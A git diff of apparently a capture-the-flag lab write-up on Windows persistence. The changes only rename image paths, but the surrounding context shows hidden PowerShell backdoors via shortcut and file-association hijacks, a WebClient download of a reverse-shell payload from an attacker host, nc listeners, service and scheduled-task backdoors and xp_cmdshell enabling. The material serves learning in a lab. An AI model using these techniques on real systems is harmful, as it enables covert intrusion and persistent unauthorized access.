@@ -119,7 +119,7 @@ We can assign such privileges to any user, independent of their group membership
 <pre class="language-powershell"><code class="lang-powershell"><strong>secedit /export /cfg C:\Users\Administrator\Desktop\config.inf
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (6) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (4) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -222,7 +222,7 @@ For this task, let's check the shortcut to **calc** on the Administrator's deskt
 
 **Target:** powershell.exe -WindowStyle hidden C:\Windows\System32\backdoor.ps1
 
-<figure><img src="../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (15) (7).png" alt=""><figcaption></figcaption></figure>
 
 Before hijacking the shortcut's target, let's create a simple Powershell script in `C:\Windows\System32` or any other sneaky location. The script will execute a reverse shell and then run calc.exe from the original location on the shortcut's properties.
 
@@ -271,7 +271,7 @@ Now let's change the registry key to run our backdoor script in a hidden window.
 powershell.exe -windowstyle hidden C:\windows\backdoor2.ps1 %1
 ```
 
-<figure><img src="../../.gitbook/assets/image (19).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (19) (6).png" alt=""><figcaption></figcaption></figure>
 
 Finally, create a listener for your reverse shell and try to open any .txt file on the victim machine (create one if needed). You should receive a reverse shell with the privileges of the user opening the file.
 
@@ -285,7 +285,7 @@ nc -lvp 4448
 
 <figure><img src="../../.gitbook/assets/image (4) (6).png" alt=""><figcaption></figcaption></figure>
 
-<figure><img src="../../.gitbook/assets/image (16).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (16) (6).png" alt=""><figcaption></figcaption></figure>
 
 ## Abusing Services
 
@@ -347,7 +347,7 @@ powershell "(New-Object System.Net.WebClient).Downloadfile('http://$KALI:81/rev-
 </strong><strong>sc.exe start THMservice2
 </strong></code></pre>
 
-<figure><img src="../../.gitbook/assets/image (1) (1) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
 
 <figure><img src="../../.gitbook/assets/image (9) (2).png" alt=""><figcaption></figcaption></figure>
 
@@ -363,7 +363,7 @@ You can get a list of available services using the following command.
 sc.exe query state=all
 ```
 
-<figure><img src="../../.gitbook/assets/image (18).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (18) (3).png" alt=""><figcaption></figcaption></figure>
 
 You should be able to find a stopped service called THMService3. To query the service's configuration, you can use the following command.
 
@@ -478,7 +478,7 @@ If we try to query our service again, the system will tell us there is no such t
 schtasks /query /tn thm-taskbackdoor
 ```
 
-<figure><img src="../../.gitbook/assets/image (17).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (17) (2).png" alt=""><figcaption></figcaption></figure>
 
 If we start an nc listener in our attacker's machine, we should get a shell back after a minute.
 
@@ -598,7 +598,7 @@ Note: While in a real-world set-up you could use any name for your registry entr
 
 ![](<../../.gitbook/assets/image (3) (2).png>)
 
-<figure><img src="../../.gitbook/assets/image (1) (2).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (1) (2) (5).png" alt=""><figcaption></figcaption></figure>
 
 After doing this, sign out of your current session and log in again, and you should receive a shell (it will probably take around 10-20 seconds).
 
@@ -874,7 +874,7 @@ To enable it, let's open `Microsoft SQL Server Management Studio 18`, available 
 
 Once logged in, click on the New Query button to open the query editor:
 
-<figure><img src="../../.gitbook/assets/image (3) (1) (3).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (3) (1) (3) (2).png" alt=""><figcaption></figcaption></figure>
 
 Run the following SQL sentences to enable the "Advanced Options" in the MSSQL configuration, and proceed to enable `xp_cmdshell`.
 
@@ -955,4 +955,4 @@ With all that ready, let's navigate to `http://$VICTIM/` and insert an employee 
 
 
 
-<figure><img src="../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>
+<figure><img src="../../.gitbook/assets/image (2) (1) (1) (4).png" alt=""><figcaption></figcaption></figure>
